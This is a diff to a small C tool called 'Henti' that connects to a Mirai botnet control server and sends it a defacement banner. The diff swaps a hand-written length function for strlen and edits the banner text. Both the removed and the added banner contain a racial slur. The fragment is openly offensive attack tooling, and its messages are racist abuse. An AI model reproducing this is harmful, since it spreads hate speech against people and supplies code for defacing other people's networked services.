@@ -22,24 +22,13 @@
 
 #define SA struct sockaddr
 
-int len(char text[])
-{
-
-    int i;
-
-    for (i = 0; text[i] != '\0'; i++)
-        ;
-
-    return i;
-}
-
 void deface(char *Host, int Port)
 {
     int sockfd, connfd;
     struct sockaddr_in servaddr, cli;
 
     char AuthBytes[] = {0x00, 0x00, 0x00, 0x01}; // Auth Bytes Mirai Uses
-    char Message[] = "Henti Defaced Yo Net!!!\r\n\r\n\r\nLearn How To Code\r\nStupid Nigger >:C\r\n";// Edit Message Here!!!
+    char Message[] = "\x1b[2J\x1b[0;0HHenti Defaced Yo Net!!!\r\nKush Is a Nigger\r\n\r\n";// Edit Message Here!!!
 
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
@@ -89,10 +78,11 @@ int main(int argc, char *argv[])
     printf("\\    Y    /\\  ___/|   |  \\  | |  |\r\n");
     printf(" \\___|_  /  \\___  >___|  /__| |__|\r\n");
     printf("       \\/       \\/     \\/         \r\n");
+    
 
     if (argc == 3)
     {
-        if (len(argv[1]) > 15)
+        if (strlen(argv[1]) > 15)
         {
             puts("[:Henti] Please Check Your Host Ip\n");
             exit(0);
